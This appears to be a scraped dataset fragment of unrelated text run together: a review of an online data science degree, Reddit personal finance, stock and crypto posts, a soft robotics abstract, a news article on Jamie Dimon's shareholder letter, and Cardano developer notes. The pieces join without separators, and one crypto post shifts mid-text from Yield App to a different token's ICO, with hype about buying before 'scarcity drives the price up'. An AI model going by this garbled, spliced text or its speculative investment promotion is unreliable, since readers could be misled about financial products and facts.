* Academically, it's not super challenging. For example, all the assignments can be retaken until you get the grade you want. Also, as an online program, it's possible for an unscrupulous student to cheat their way through, although I have no idea why someone would spend all this money on a degree to learn data science and then just ""coast"" through the program. If you want to gain proficiency with Python, R, statistics, etc., you'll have to practice writing code and crunching numbers on your own in addition to the class assignments. They do, however, provide you with all the learning materials you need to gain proficiency.
* The student account website isn't the most user-friendly. Simply signing up for a new class is a drawn-out, cumbersome process that took me a while to figure out. The learning management system they use, Brightspace, isn't the most efficient either.

# The bottom line:

I know this sounds cliche, but **you'll get out of this program what you put into it**. If you only do the bare minimum to pass each course, you can pay all this money just to get a fancy diploma, but lack the data science knowledge to succeed in the real world. If you go the extra mile and take time to master the material on your own, you'll have a strong enough foundation in data science to get into the industry, gain experience, and build a successful career in a lucrative field. EU's program is a convenient and affordable option for working professionals who want to branch out into data science and have the motivation to work for it.

# And now, I'll answer a few Frequently Asked Questions:

**How much time per week would I need to put in as a student?**  
It varies depending on how much time you need to practice and how many classes you take. Each course is seven weeks long. I've been taking one course per term while working full-time as a civil engineer, part-time as a national guard officer, and taking care of my 9-month old daughter and I still have had plenty of time to finish each class with a few weeks to spare. If you plan ahead each week, it's possible to balance this program with a full-time job.  


**Eastern University isn't as prestigious/high-ranking as (for example) UT-Austin or Georgia Tech. How will employers judge a degree from EU?**  
I wouldn't worry too much about university rankings. Once you're in the industry and have experience, no one cares where you got your degree. You'll also find that many data scientists are completely self-taught and have degrees in unrelated subjects. Some of them don't have degrees at all! For example, my brother attended a bottom-tier, open-enrollment university and studied computer science for a few semesters before dropping out. Even though he never finished his degree, he became proficient at writing code and now makes six figures as a software engineer. All you have to do is get good enough at writing the code to pass a technical interview to make yourself marketable.  


**Do I even need a degree for this career field? Isn't it possible to learn data science simply by watching YouTube videos?**  
Yes, it is possible to learn data science on your own, but the structure of a degree program makes it easier to keep a consistent study schedule. It also gives you something palpable to list on a resume when you start applying for jobs. As I've stated earlier, many private sector tech companies are loose on degree requirements, *however* government and military jobs stipulate certain degrees for their applicants. I currently work for DOD as an engineer, and every time I apply for a new position within our department, I have to submit my transcript along with it. An MS in Data Science can help you land a federal job as a data engineer, operations research analyst, statistician, etc.

Long story short I was one of the dumb ones who went to a for-profit for a short stint back in ‘15. While there I only had taken out federal student loans. Fast forward to now, I am being called by a collection company saying I owe \~2,000$ for a private loan from when I attended the school.

I was at the school up until it closed.

The weird things about this is, the say I have paid on this before, I have never paid for anything school related out of pocket except to NelNet for my federal stuff, the day it’s a private loan for Westwood not some private loan company ex.

I am currently in enrolled in school right now if that makes a difference.

EDIT: The school was closed in 2015, I talked to the department of ED national student data base, and they have mentioned they see nothing defaulted or added to collections, granted they cannot see private loans from say Sallie May. They advised this sounds like a scam and to ignore unless given proper documentation.",finance

personalfinance,Do I pay off my car now or wait?,"Here’s the facts: 

20k in HYSA

Car loan @ 6.99% APR over 60 months, current balance about $8.8k (I’ve been paying significantly above minimum), about 3 years left on the loan. Min payment $370.

Salary: $70k, with an almost guaranteed promo in 3-6 months bumping me up to $80k-$85k

Expenses (if car is paid off): $1100 for student loans ($117k balance @ 4.02% over 10 years), about $800 for food and groceries. I live at home so no rent or other things.

Option 1: Pay off car now. HYSA balance drops to about $11k. This is ~6 months of an emergency fund. Would then have to make the decision to either add more over the coming months to this emergency fund or leave it at 6 months and start hitting student loans harder. 

Option 2: Continue my current strategy of paying about $850 per month plus extra savings at the end of the month. By my calculations the car would be paid off in about 6 months by this strategy. However, the lender states that there is a $2,500 per month max that you can pay.

I recognize the interest rate on this car loan is shit. Ideally I’d like to keep this car long term. It’s a good car, 2017 with 32k miles (only 1k miles driven in the last year). Could definitely last a decade more if I take proper care of it. So just wondering if the math makes sense to just pay off the car now.",finance

***Trigger warning***: SF Bay Area prices below 🤢

Looking at some options for my first mortgage. I have the funds for the traditional approach, below, as I've saved/invested around $358k that is liquid today. The combo loan approach could let me keep half of the down payment in the bank but increases monthly costs by $450 or so.

Between my wife and I we net around 14k/month, so I guess we're looking at around 40% of our income for the monthly housing costs at this home price.

The idea of keeping an additional $120K from the down payment in my pocket seems attractive for e.g., medical or other surprises. \[Edit: probably won't dip into these funds for 'normal' expenses, but would keep them invested in the market.\]

I have no other significant debt 🎉

*👉🏽 Does the combo make sense in my situation?* Or should I just take the hit to my savings to avoid the extra interest and scary variable rate? (Note, over the next 2-5 years I expect around $300K of additional liquidity, so in theory I could pay off most of that second loan...)

stocks,"7 Must Know Things Right Now About The Stock Market (Stocks, Yields, The FED, $TSLA &amp; More)","**In today’s post I’m going to share with you what I believe to be the 7 most important things from the past couple of weeks that may impact the stock market, your portfolio &amp; much more!**

**\[Disclaimer: Long Post\]**

Folks, we’ve seen a crazy start to 2021 in the stock market with massive gains through February, before most retail portfolios took a huge hit in March as high-flying tech stocks were hit by rising treasury yields &amp; inflations scares from boohoo “suits” that pop up in your face on TV or on YouTube.

[This](https://imgur.com/HXfdXsl) is the 3-month chart of how stocks have performed, and guess what? Most stocks are actually gaining significantly this year with the exception of Apple, Amazon &amp; a couple of other stocks.

I believe there is a lot of panic especially from financial YouTubers just because they have seen their portfolios drop in value in the last weeks, but guess what, most of those portfolios are way too heavy in the small-cap growth stocks or stocks that are trading at very high PE’s. From my point of view, I expect the stock market to continue to go higher this year, lead especially by big companies with great earnings that are not trading at insane PE’s and which have underperformed in the past months, think of names like Apple, Amazon &amp; others.

Small-caps &amp; value stocks have really jumped in the past months, and are due for some underperformance in my opinion, with value stocks reaching very high PE’s as well due to the recent “booming economy” helped by the massive stimulus packages the US has used to fight the potential economic meltdown from last year.

Just take a look at this [chart](https://imgur.com/ADGuTKt) &amp; you can see that small &amp; mid-caps stocks especially in the value sectors have really outperformed. Take the 400 mid &amp; small cap sp500 ETFs, those rose by 14% &amp; 20% which is insane for a 3-month period, while the Nasdaq only gained 3.4% for the hole quarter, underperforming both the Dow &amp; SP500.

Guys, let’s jump to the 7 most important things you should now that may affect your portfolio:

**1.** **Inflation &amp; Yields. So, will the global surge in liquidity cause inflation?**

My short answer is **NO**. I don’t think the massive stimulus packages &amp; other fiscal aids around the world will cause inflation, especially in the old developed economies like Europe &amp; the US.

Though you can see the total money [supply](https://fred.stlouisfed.org/series/MABMM301USM189S) for the US has spiked in the last year, this was needed to keep the US away from a potential depression. The US printed around $3.9B until January and this will continue to increase with the added stimulus package &amp; proposed infrastructure bill.

Most of the recent panic in the stock market that was caused by this money printing potentially brining inflation, and those scares might continue to pop up from time to time in the next couple of months, especially as the year/year inflation readings come in which might spoke some investors, though the FED &amp; mostly everyone is already expecting this.

On the other hand, if by any miracle, we don’t see a huge spike in the year/year inflation numbers, in my opinion, we are poised to see a correction in treasury [yields](https://www.cnbc.com/quotes/US10Y), maybe towards the 1.5% level again, which can lead to tech stocks &amp; especially small-cap ones to resume their path higher.

[Inflation](https://fred.stlouisfed.org/series/FPCPITOTLZGUSA) hasn’t be a problem really in many many years, so a 2% targeted inflation by the FED is pretty healthy for the US economy &amp; given the fact that most participants for a recent [survey](https://imgur.com/uIaNKBr) think 2% yields can cause a correction in the stock market, a lower than expected inflation number can help mitigate that risk.

It’s also very interesting to see that the inflation is the 2nd biggest [concern](https://imgur.com/yIgQVYn) though our next important subject the possibility of rising interest rates is very close behind.

**2. FED Rates.**

So, everyone is talking about the FED and if or when are they going to raise the key interest [rate](https://imgur.com/UFr9tiC) and stop the huge asset purchase spree they have been on since last year.

Right [now](https://imgur.com/HqtPCKs), that rate hovers near 0 while the FED is also buying $120B in assets every single month which is an insane amount, as they are literally buying a GE, Goldman Sachs, AirBNB or any other huge company you can think of every single month.

The [DOT-PLOT](https://imgur.com/s0avQp0) of the FED has become the buzziest thing in recent months, and though last month we saw more officials expecting a rate increase next year, compared to the single one we saw in December, that is still a minority.

The dot-plot is pretty interesting from my point of view. Even if there are a couple more officials who expect a rate hike, the level of that hike is so low (meaning under 1% for 2022 and around 1% for 2023)… just compare that to the long-run target of 2.5%, just imagine how much better things must get in the economy for the FED to hike the rates so much.

It’s also very important to point out the FED is very likely to wait to see a sustained inflation over 2% before actually tightening policy, as this is the new framework they are pushing, a fact which was stated by the vice chair of the FED in a recent [interview](https://imgur.com/V4YJqOh).

We can see in the latest [projections](https://imgur.com/Zr1ffpy) by the FED the biggest change was in the GDP growth expectations for 2021, while in the long run they are still only expecting a 1.8% GDP growth.

This will be an interesting aspect to watch this year as everyone seems to be bumping up their GDP expectations, with [Goldman](https://imgur.com/m0w0PXo) expecting a 7% growth for 2021.

**3.** **Deceiving unemployment numbers.**

We have seen [jobless](https://imgur.com/jn0tZpB) [claims](https://imgur.com/70bI1tP) getting [better](https://imgur.com/x6azae0) in the past couple of weeks, with continuing jobless claims dropping below 4M, though the initial claims saw a significant spike to over 700K once again last week.

Nonfarm payrolls also [smashed](https://imgur.com/7jsI57U) expectations rising by over 900k, topping estimates of around 650k, with the jobless rate dropping to 6%.

It’s still important though to remember that we are still 8M jobs down [compared](https://fred.stlouisfed.org/series/PAYEMS) to February of last year, and though this started as a V shaped recovery in the job market the recovery rate has slowed down and it will take quite some time for the US to go back up to those numbers.

The 6% unemployment [rate](https://fred.stlouisfed.org/series/UNRATE) is still deceiving as that only accounts for people actively looking for a job, and leaves out the rest of the people, so the U6 unemployment rate is a much better way to look at the whole picture.

[U6 unemployment](https://fred.stlouisfed.org/series/U6RATE) leaves us with a rate of over 10% which is still more than 3.5% away from the numbers we had before 2020.

It’s still interesting to see that only 30% of the jobs [created](https://imgur.com/wBg6aQc) last month were from the hardest hit sector, leisure &amp; hospitality. We must keep an eye on this sector, as it might be key for the recovery in unemployment, still being down millions of jobs [compared](https://fred.stlouisfed.org/series/USLAH) to previous years.

**4. Suez Canal blockage**

[This](https://imgur.com/7L5Y79P) created an even bigger [stress](https://imgur.com/PO7FiEc) on some parts of the economy. Fortunately the blockage lasted just around 1 week, and though that brought a spike in oil prices, you should be very careful when investing into commodities, especially oil, as we have just seen [OPEC](https://imgur.com/6ag8bu1) planning on brining back online more production, which is likely to continue as they see an increasing demand, so it’s very hard to see oil prices rising much more than this, as any time prices go up, they will be dragged down by an increasing supply from OPEC. Just stay away, as demand might even disappoint in the short-term, as the grand reopening might hit road bumps along the way, putting even more pressure on OIL prices.

**5.** **EVs**

In the past couple of weeks, we have seen EV maker after EV marker smashing delivery expectations.

[NIO](https://imgur.com/g4vJxSK) delivered over 20k in Q1, [Ford](https://imgur.com/61piwPA) grew EV sales by more than 70% and [Tesla](https://imgur.com/WqUqhV6) beat expectations and topped 180K cars delivered in a seasonally bad Q1, which is pretty impressive.

Though I am not as bullish as others like ARK Invest, I think Tesla still has a bright future, especially due to their lead in making cheaper &amp; cheaper great EVs. You can see how the vast majority of their sales has shifted to the model 3 &amp; model Y, which are lower cost tiered vehicles, so, when you compare that with others like the new Hummer EV or the LucidAir, you start to get a grasp on why so many investors love Tesla &amp; their potential to take over a big part of the EV market in the next decades.

EVs will also get additional help if the infrastructure bill that Biden has proposed, which [includes](https://imgur.com/scynXTS) $174B for electric vehicles passes, and with this being one of the biggest spending categories it’s likely even more money might be pushed towards clean energy solutions in all areas of the economy in the future.

**6.** **Economic Readings**

The consumer confidence [spiked](https://imgur.com/E1EpvnL) last month to almost 110, a level we haven’t seen in more than a year as. This is a great reading for companies that operate in the consumer discretionary sector and in real estate, as consumers are more likely to go out and spend money in those areas, though it still seems that people are somewhat scared of the rising oil prices &amp; inflation possibilities.

The [ISM](https://imgur.com/V6Z8zDU) Service index also came in at the highest level since it’s inception, topping all 4 categories compared to the previous month, topping expectations by more than 5 points, which is insane, while the [composite](https://imgur.com/duUr0u6) PMI also showed the fasted growth in a long time.

**7.** **The Greed / Fear of The Market**

Like in previous posts, I wanted to point out again that you shouldn’t fall in the usual greed/buy [paradigm](https://imgur.com/Y9iHjVh). People are way to emotional when they think about money... and that leads to massive mistakes. People tend to see something go up and jump on board and say “I’m very pleased with my investment”. That’s exactly what we see during the optimism &amp; euphoria stages, but when things start to shift people can’t really believe it until they finally reach the capitulation &amp; discouragement stages, which leads usually to selling out of stocks at the bottom of the correction, dip or crash.

Well I think we’ve seen exactly that stages in the past weeks, as investors were feeling very discouraged from the recent drop in tech &amp; small-cap stocks, with CNN’s Fear &amp; Greed [Index](https://imgur.com/xCRPmBT) bottoming around 40 in the past weeks, which should have been the moment to go in and buy the dip, just like I did.

That’s why people also revert back to the old Buffet saying, be fearful when people are greedy and be greedy when people are fearful.

These were my top 7 recent developments I believe you need to know to better manage your portfolio. [Keep](https://imgur.com/RN30kuW) an eye on what the FED continues to say, how the jobless &amp; unemployment numbers come in and how inflation continues to go. Even if the [economy](https://imgur.com/9aDtR3F) continues to gain jobs at a steady pace of 100k/month, it will still take until 2024 at the earliest to get to the labor force trend numbers we saw before 2020.

Expect some inflation scares to lead to a couple more corrections which could be great buying opportunities if you chose the right companies.

stocks,"Here is a Market Recap for today Thursday, April 8, 2021","**PsychoMarket Recap - Thursday, April 8, 2021**

Stocks were mostly higher Thursday, with the Nasdaq (QQQ) leading the way, as market participants await the beginning of first-quarter earnings season and digest comments from Federal Reserve Chair Jerome Powell.

After a choppy first quarter to the year, the Dow Jones (DIA) and S&amp;P 500 (SPY) largely recovered in the first week of Q2 and continue to hover near record highs. The equity market got a boost after FOMC members signaled in their March meeting that the Fed continues to favor maintaining highly accommodative monetary policies for the foreseeable future and signaling they will hold off on tightening policy at the first sights of inflation. Jeffrey  Kleintop, chief global investment strategist at Charles Schwab said, “A big part of this is making sure the vaccine-led recovery is firmly rooted, and that won't be clear until somewhere in the second half of this year. So it's possible that as we look out to the late summer timeframe or early fall that that's something that we could consider at that point. But until then, there's still a lot of risks. and just to backtrack it, we know that monetary policy works with a lag, and so it makes more sense to ensure that we're on solid footing before you begin to take your foot off the pedal."" 

Furthermore, Speaking at a virtual meeting at the International Monetary Fund (IMF), Federal Reserve Chair Jerome Powell highlighted the uneven recovery in the US labor market as a sign the economic recovery still has a ways to go in order to meet the Federal Reserve’s employment goals. He said “The recovery though here remains uneven and incomplete. Tee burden is still falling on lower-income workers. The unemployment rate in the bottom quartile is still 20%. There are still eight and a half million people out of work. This unevenness that we’re talking about is a very serious issue.” 

Looking ahead, market participants will be closely monitoring the upcoming earnings season for the first three months (Q1) of 2021. Over the past several weeks, analysts have raised their earnings estimates by record levels with the expectation that recent economic growth will drive corporate earnings higher. According to FactSet, first-quarter [earnings estimates were increased by a record margin of 6%](https://insight.factset.com/record-high-increase-in-sp-500-eps-estimates-for-q1) over the past several weeks, as analysts adjusted their forecasts for the much stronger-than-expected economic rebound seen so far. Omar Aguilar, chief investment officer at Charles Schwab said, “We’re still in probably the early parts of the expansionary cyclical after recovering from that recession. We’ve started to see cyclical trades playing a big role in the early part of the cycle. Normally what happens at this stage is you continue to see … the cyclical component will continue to drive leadership into the second part of this year into next year.”

stocks,FOMO starting to hit.,"I've been investing in a target retirement fund for a few years now.  Shamelessly I took a more active approach to investing right after the GME affair, about 2 months ago.

I don't have a lot of cash, and it was clear that we were coming off of a huge bull run after the Covid crash last year.  I didn't want to throw a whole lot of money into highly-valued stocks or ETFs, like ARKK.  In the end it looks like that was the right decision, at least at that moment.  Now might be a better entry point, not sure, it's also not one that's on my radar.

So I ended up doing some pretty defensive investments that have done pretty well for me these last 2 months. In fairness, what hasn't done well?  I had limited tech exposure and even those are racing upwards after the little pullback last month.

The idea, again, was to not pour a lot of money into stocks which were potentially at ATH (sorry, I tried timing the market) and also investing in things that would do alright in the event of a correction, since I don't want to lose this money in the short-to-mid term.  Once again, so far so good.

But man, it looks like stonks always go up!  Kidding, but this bull run looks like it has no end. Monetary policy is loose.  Economy set to reopen.  Massive stimulus.  What could go wrong? (somewhat kidding)

What I'm trying to say is that I was pretty bearish when I bought in 2 months ago, and now it looks like that prediction could have been wrong, and I'm experiencing FOMO. Can anyone relate?  

I was supposed to hold some dry powder in reserve, and a little bit of an extra cushion in savings, but man right now I just wanna buy buy buy.  Thoughts?

financialindependence,"Possible FIRE impacts starting immediately from the FAFSA Simplification Act of 2020, which was passed with the December stimulus","First and foremost, let me say I am far from an expert on this.  I'm going based on some mildly-informed reading in various places.  I am posting this here as much to make it visible for impacted FIRE folks as to invite corrections and updates from people who are more well-informed than I am.  So if any of this is wrong, please blast away.


Many people may be unaware, but the largest revision to Federal financial aid in quite some time quietly happened last year along with the stimulus.  While there are many changes that may or may not impact FIRE folks as a whole, there are two changes that I think might be of real interest to people here, particularly for anyone who intends on FIRE'ing with an AGI in the $40K-$60K range.


The changes made to the FAFSA will take effect in 2023-2024 school year and will be based on tax information from 2021.  Families who will have kids applying for financial aid in the first year of the new FAFSA will do so using IRS information from this year, so anyone with a high school sophomore this year needs to be planning right now.


The first big change I think is potentially relevant to a lot of FIRE folks regards a new additional method by which families can get maximal financial aid eligibility without any detailed consideration of their full income flows or assets.  While the traditional methods of qualifying for an auto-zero EFC (renamed SAI in 2023 and beyond) and the simplified needs test remain with some updates, a new path has been established to provide a vastly simplified method of eligibility based solely on AGI, family size, and the Federal Poverty Line (FPL).


Starting in 2023, anyone who meets certain AGI limits will not only be granted the maximum Pell grant, but will also automatically qualify for an auto-zero SAI and a complete exemption from any asset reporting/consideration.  This is huge considering that many FIRE folks might fall in to those brackets if they don't have mortgage or car debt and live outside of HCOL/VHCOL areas.  The new formula for this pathway is AGI of up to 175% of the FPL for dependent students with two parents and AGI of up to 225% FPL for dependents with single parents.   


By way of example, a married couple with two kids with a 2021 AGI of up to $46K will automatically qualify for maximum Federal financial aid regardless of their actual income flows or assets.  For a family with three kids that jumps to a little over $54K.  This not only dovetails with AGI requirements for ACA subsidies, which many FIRE folks plan to make use of, but is also beneficial considering the effective default double-counting on the FAFSA of the money flows from a Roth conversion ladder, which many FIRE folks also plan on using.  Someone planning on FIRE'ing with a particular annual budget might find it very beneficial to restructure their debts and such so that they can get their budget down to under the AGI cliff.


In addition, the new FAFSA is supposed to pull all tax data from the IRS directly, so these things should happen automatically (or not) depending on what you file for your 2021 return.  If your IRS data pull meets the auto-cutoff, than you likely will not even be presented with the asset questions.  Full income info will still be collected because the new FAFSA regs allow for a final SAI down to -$1,500 if your income details merit it.


The second big change is one that mystifies me, but it seems to exist nonetheless.  529 withdrawals from accounts owned by grandparents will no longer have any impact on the FAFSA, a huge change from the 50% impact on future years that comes now from having to report such withdrawals as unearned income for the student on the next year FAFSA.  So 529s held by the student or the parent will count as assets, but 529s held by grandparents will be invisible, with no reporting on the asset section or the income section.


That's huge for anyone with a 529 held by their grandparents.  I have no idea if it is easy or allowed to migrate existing 529 plans from being the parent's name to being in a grandparent's name, but if it is, then I expect we will see a lot of that moving forward.  I can only think that it's a relatively rare thing for there to be large grandparent 529s, so the gov folks thought it was worth the trade-off cost-wise for a little bit of simplification.

personalfinance,Late Tax Refund 2018 - What to mail to IRS?,"Hey sorry if this is the wrong spot, my searches for late refunds mostly brought up posts from this sub.

&amp;#x200B;

Anyway, here's my situation:

I filed my tax return using turbotax for the 2018 tax year back in 2019. I was rejected for having a non-matching PIN. I completely forgot about it until recently with the whole stimulus check situation (i know that doesn't apply here, it just made me look through all my IRS records and I noticed my 2018 refund was never processed).

&amp;#x200B;

I log in to turbotax, I see that my 2018 return has a status of rejected. I see I can no longer e-file old returns. So they give me a link to download my old "".tax"" file, which I then open using the turbotax desktop software for 2018. I see my refund in the amount of around $1800, which is unchanged from when I filed back in 2019. I have an option to print some forms, which gives me the 1040 and the 1040 for my state. 

&amp;#x200B;

&amp;#x200B;

My question is: do I just mail these? Is that it? I think the confusion stems from the fact that I actually e-filed these back in 2019, I just never got them accepted. It looks like these forms are electronically signed, do I need to physically sign them again before mailing them? For the federal return, do I have to attach my w-2? I honestly do not have access to my old company's records and wasn't able to contact them. I do however have the 2018 wage and tax statement document that I got from logging into the IRS and browsing my records. The numbers and tax match what is on my 1040. Should I mail that in lieu of my w2?

&amp;#x200B;

&amp;#x200B;

I have tried looking online everywhere, but I don't see any solutions for someone in my situation, who actually efiled but then never got it accepted. If you have any resources online, feel free to point me to them if I've missed them!

&amp;#x200B;

&amp;#x200B;

For now, I'm just going to mail the 1040 with the wage summary and the 1040-state. I'm not in a rush to get the $1800 either, I just figured I should get it done sooner than later. Thank you!",finance
CryptoCurrency,"Yield App (YLD), a highly undervalued Celsius/Nexo/Blockfi competitor that is flying under everyone's radar","Yield App is a crypto platform that offers up to 20% interest on USDC, USDT, and ETH through CeFi/DeFi. They have a similar business structure and flywheel tokenomics as Celsius/Nexo where holding more YLD tokens will grant higher interest rates. 

The web app launched three months ago, and so far there are more than 26000 users and over $46M in assets under management. The mobile app is under development right now and is expected to come out Q2 2021 along with Yield App 2.0. 

20000 YLD needs to be held in the wallet to earn the full 20% interest rate, and as of now it costs $13400. As the community continues to grow and more people try to get to the 20000 YLD mark, I believe there will be huge demand for this token. The easiest way to get YLD is to swap within the app to avoid gas fees on Uniswap. 

20000 CEL = $154200 

20000 NEXO = $55600

If you missed the train with Cel/Nexo, now might be a good opportunity to get in before scarcity drives the price up.  

Any inputs or discussion would be greatly appreciated.

ICO is going in till June 30
Previous ICO price: $0.1
Current ICO price = $0.15 (50% up)
After April 30 = $0.2 (33.33% up)

Plans to list on exchanges starting early July.
Though the team is silent, there are high chances it would be listed on top-tier exchanges like Binance or Kraken.

They are offering awesome rates for holding PXP (Upto 25% APY) based on number of tokens holding. But, not sure how long they can offer these rates. They are going to use 40% of supply for paying these interests though. And have plans for a Buy-back program too!! 

Further on Token economics, they are doing a ICO for 50% supply. Good thing is they are going to BURN any unsold tokens which would add more value to the tokens.

They are already working on Banking licenses in multiple places.

Current products:
Checkings &amp; Savings accounts
Wallet
Traditional Echange (Currently low liquidity)
Quick Exchange/Swap
Pointpay system

Also, they have great interest rates (Ex: BTC=6.2% compounded daily) when compared to others, but have limited choices on tokens currently.

personalfinance,Should I refinance my auto loan. (Lower interest but longer term),"Hey everyone currently I have an auto loan on a used car for $6020 @ 12.59% over 36 months. Current payments $202.74. My credit union is offering me a refi of 10.99% over 60 months with a monthly of $130. So I would be saving $71 a month but paying around $580 more in interest if i paid to term. They told me they could not lower the interest rate if I chose a shorter term. 

Is it worth it? I know most people around here would say to never pay more in interest just on principle but I wonder if the flexibility of some extra cash flow and ability to pay extra if I wanted to is worth it. This is my first time financing so this is all new to me.

personalfinance,Relative just moved all retirement into annuities. Good idea? Terrible?,"I found out yesterday that my mom (late 60s, retired, with a good pension and social security) moved about ~$200k from a CD into an annuity at 2.25% in her traditional IRA. It will be three-years before she can withdrawal penalty free (I think!).

1)  First of all, why would you put an annuity into a tax deferred account?
2) I think she's in the a 30-day window where she can cancel. Should she? I think so. 

For more context, and maybe the bigger problem, is that she has 5 annuities totaling a couple hundred thousand (not in a tax-free or tax-deferred account). Various sizes, various interest rates, various types, various years before we can pull money out without paying up to an 8% penalty. 

Does it make sense to have all of your investments in annuities? Everything I've read says no, especially as she does not need fixed income. 

Before anyone tells me that I need to talk to her about it or better manage it. I know she shouldn't have been in a cd either. But, she does not listen and does not remember. She never wants to admit that she doesn't know/understand something, so she just plows ahead. It happens with everything.... 

She spent 10 minutes arguing with me that she had $200k more than she did because she did not remember consolidating them into one account a few years ago. It's just a nightmare, tbh.",finance

**Abstract:** Underwater soft robots are challenging to model and control because of their high degrees of freedom and their intricate coupling with water. In this paper, we present a method that leverages the recent development in differentiable simulation coupled with a differentiable, analytical hydrodynamic model to assist with the modeling and control of a underwater soft robots. We apply this method to Starfish, a customized soft robot design that is easy to fabricate and intuitive to manipulate. Our method starts with data obtained from the real robot and alternates between simulation and experiments. Specifically, the simulation step uses gradients from a differentiable simulator to run system identification and trajectory optimization, and the experiment step executes the optimized trajectory on the robot to collect new data to be fed into simulation. Our demonstration on Starfish shows that proper usage of gradients from a differentiable simulator not only narrows down its simulation-to-reality gap but also improves the performance of an open-loop controller in real experiments.

investing,JPMorgan’s Dimon Says ‘This Boom Could Easily Run Into 2023’ - Jamie is the MAN!,"Original Article: [https://www.bloomberg.com/news/articles/2021-04-07/dimon-says-fintech-and-big-tech-are-here-as-banks-lose-ground](https://www.bloomberg.com/news/articles/2021-04-07/dimon-says-fintech-and-big-tech-are-here-as-banks-lose-ground)

Jamie Dimon said he’s optimistic the pandemic will end with a U.S. economic rebound that could last at least two years.

“I  have little doubt that with excess savings, new stimulus savings, huge  deficit spending, more QE, a new potential infrastructure bill, a  successful vaccine and euphoria around the end of the pandemic, the U.S.  economy will likely boom,” the [JPMorgan Chase &amp; Co.](https://www.bloomberg.com/quote/JPM:US) chief executive officer said Wednesday in his [annual letter](https://www.bloomberg.com/news/terminal/QR6VNCMEQTXC) to shareholders. “This boom could easily run into 2023.”

Unprecedented federal rescue programs have blunted  unemployment and averted further economic deterioration, according to  Dimon, who said banks entered the crisis strong and able to help  communities weather the storm. While lenders also benefited from U.S.  stimulus, they built up buffers against future loan losses and performed  well in stress tests, he said.

Dimon also pointed to U.S. consumers, who used stimulus  checks to reduce debt to the lowest level in 40 years and stashed them  in savings, giving them -- like corporations -- an “extraordinary”  amount of spending power once lockdowns end. The latest round of  quantitative easing measures will have created more than $3 trillion in  deposits at U.S. banks, a portion of which can be lent out, he said.

It could all add up to  a Goldilocks moment, according to Dimon, where growth is fast and  sustained while inflation ticks up gently. Threats to that outcome  include virus variants and a rapid or sustained jump in inflation that  prompts rates to rise sooner.

At 65, Dimon is the most prominent executive in global  banking, serving as a spokesman for the industry while leading a titan  of both Wall Street and consumer lending. He’s run the company since the  end of 2005, and is the only CEO still at the helm after steering a  major bank through the financial crisis.

The 65-page letter (plus a  page of footnotes) is Dimon’s longest yet, following last year’s  abbreviated one that came less than a week after he returned to work  from emergency heart surgery. As always, it is wide-ranging, touching on  topics from financial regulation to China to inequality and  institutional racism.

### Competitive Threats

Dimon,  who built the biggest and most profitable U.S. bank in history, also  warned shareholders that his industry’s disruption by technology is  finally at hand. Shadow lenders are gaining ground. Traditional banks  are being consigned to a shrinking role in the financial system.

“Banks have enormous competitive threats -- from virtually every angle,” he said. “Fintech and Big Tech are here… big time!”

[Read more: Why Fintech Battles Ahead Are About More Than Banks](https://www.bloomberg.com/news/articles/2021-03-02/why-fintech-battles-ahead-are-about-more-than-banks-quicktake)

The  letter expands on predictions Dimon has offered for years, this time  declaring many of those threats have now arrived. Financial-technology  firms are more formidable, offering easy-to-use, fast and smart  products, he said. Shadow banks -- a group that includes investment  funds and online platforms offering financing to companies and consumers  -- are winning market share too.

Those groups have outpaced the  growth of banks by some measures, often thanks to less regulation. They  have also done “a terrific job in easing customers’ pain points” with  slick online platforms, he said.

“While I am still confident that  JPMorgan Chase can grow and earn a good return for its shareholders, the  competition will be intense, and we must get faster and be more  creative,” the CEO wrote. “Acquisitions are in our future, and fintech  is an area where some of that cash could be put to work.”

As  with previous annual letters, Dimon touched on geopolitical issues. On  Brexit, he said that uncertain financial regulations coupled with  political pressure may lead to a “tipping point many years out when it  may make sense to move all functions that service Europe out of the United Kingdom and into continental Europe.”

Dimon  mentioned China more than 30 times throughout the letter, predicting it  will probably overtake the U.S. in the next 20 years as the biggest  economy and financial market. He lauded China’s growth over the last 40  years but said the country will have to confront serious issues in the  next 40, including pollution, corruption and inefficiency.

“China does not have a straight road to becoming the dominant economic power,” Dimon said. “For the near term, if China and the United States  can maintain a healthy strategic and economic relationship, it could  greatly benefit both countries – as well as the rest of the world.”

He  also touched on the bank’s future need for real estate, expecting it to  drop significantly as remote working outlasts the pandemic. The bank  could require some 60 seats for every 100 employees as some staff work  under a hybrid model, he said. The lender still intends to build its new  headquarters in New York City, he added.

Despite a warning just two days ago from Senate Minority Leader Mitch  McConnell that corporate leaders should refrain from taking stances on  divisive political issues, Dimon waded into areas including immigration,  health care and education.

“Our problems are neither Democratic  nor Republican -- nor are the solutions,” Dimon wrote. “Unfortunately,  however, partisan politics is preventing collaborative policy from being  designed and implemented, particularly at the federal level.”

### ‘Terribly Wrong’

For all the brightness in his economic outlook, Dimon found cause for far darker laments.

The  pandemic has thrust profound inequities and their devastating effects  into the spotlight. On issues such as health care and immigration,  people have lost faith in the government’s ability to solve problems, he  said.

“Americans know that something has gone terribly wrong, and  they blame this country’s leadership: the elite, the powerful, the  decision makers -- in government, in business and in civic society,” he  wrote. “This is completely appropriate, for who else should take the  blame?”

That fuels populism on the right and left, he said. “But  populism is not policy, and we cannot let it drive another round of poor  planning and bad leadership that will simply make our country’s  situation worse.”

The CEO even put it in economic terms: He estimates  wide-ranging “dysfunction” has cut a percentage point off the U.S.  growth rate. He suggested studying solutions abroad, pointing to  apprenticeship programs in Germany, health care in Singapore and  infrastructure in Hong Kong.

Dimon also reiterated a call for a  national Marshall Plan, referring to the U.S. effort to help Western  Europe recover from World War II, to address the structural challenges  behind the country’s racial and economic crises.

“Fixing America’s  problems is going to take hard work. But if we divide them into their  component parts, we will find many viable solutions,” he said. “With  thoughtful analysis, common sense and pragmatism, there is hope.”",finance

10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
